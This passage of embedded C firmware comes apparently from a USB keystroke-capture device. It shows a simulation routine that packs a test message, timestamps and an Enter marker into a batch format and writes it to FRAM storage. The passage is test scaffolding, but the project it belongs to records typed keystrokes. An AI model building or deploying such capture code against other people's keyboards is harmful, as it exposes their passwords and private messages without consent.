        msg_len = SIM_MAX_MESSAGE_LEN;
    }

    // Build FRAM batch in the same format as Core1
    // Format: [start_epoch:4][final_epoch:4][data_length:2][flags:2][data:N]
    uint8_t fram_batch[FRAM_MAX_BATCH_SIZE];
    memset(fram_batch, 0, sizeof(fram_batch));

    // Get current epoch timestamp
    uint32_t current_epoch = getValidTime(RTCQualityFromNet);
    if (current_epoch == 0) {
        current_epoch = millis() / 1000;  // Fallback to uptime
    }

    // Write start_epoch (4 bytes, little-endian)
    fram_batch[0] = (uint8_t)(current_epoch & 0xFF);
    fram_batch[1] = (uint8_t)((current_epoch >> 8) & 0xFF);
    fram_batch[2] = (uint8_t)((current_epoch >> 16) & 0xFF);
    fram_batch[3] = (uint8_t)((current_epoch >> 24) & 0xFF);

    // Write final_epoch (same as start for single message)
    uint32_t final_epoch = current_epoch + 1;  // Add 1 second for realism
    fram_batch[4] = (uint8_t)(final_epoch & 0xFF);
    fram_batch[5] = (uint8_t)((final_epoch >> 8) & 0xFF);
    fram_batch[6] = (uint8_t)((final_epoch >> 16) & 0xFF);
    fram_batch[7] = (uint8_t)((final_epoch >> 24) & 0xFF);

    // Write data_length (2 bytes, little-endian)
    // Include message + Enter marker (0xFF + 2-byte delta)
    uint16_t data_len = (uint16_t)(msg_len + 3);  // +3 for Enter encoding
    fram_batch[8] = (uint8_t)(data_len & 0xFF);
    fram_batch[9] = (uint8_t)((data_len >> 8) & 0xFF);

    // Write flags (2 bytes) - 0 for normal batch
    fram_batch[10] = 0;
    fram_batch[11] = 0;

    // Write keystroke data starting at offset 12
    memcpy(&fram_batch[12], message, msg_len);

    // Add simulated Enter key with delta encoding
    // Format: 0xFF marker + 2-byte delta (time since start in seconds)
    size_t enter_pos = 12 + msg_len;
    fram_batch[enter_pos] = 0xFF;  // DELTA_MARKER
    uint16_t delta = 1;  // 1 second delta for simulation
    fram_batch[enter_pos + 1] = (uint8_t)(delta & 0xFF);
    fram_batch[enter_pos + 2] = (uint8_t)((delta >> 8) & 0xFF);

    // Total batch size: header (12) + message + enter (3)
    uint16_t batch_size = 12 + data_len;

    // Write to FRAM
    if (!framStorage->writeBatch(fram_batch, batch_size)) {
        LOG_ERROR("Sim: Write failed");
        return false;
    }

    sim_batch_count++;
    sim_last_batch_time = now;

    LOG_INFO("Sim: Batch #%lu (%u bytes)",
             (unsigned long)sim_batch_count, batch_size);

    return true;
#else
    LOG_WARN("Sim: Requires FRAM");
    sim_enabled = false;
    return false;
#endif
}
#endif /* USB_CAPTURE_SIMULATE_KEYS */

#endif /* XIAO_USB_CAPTURE_ENABLED */
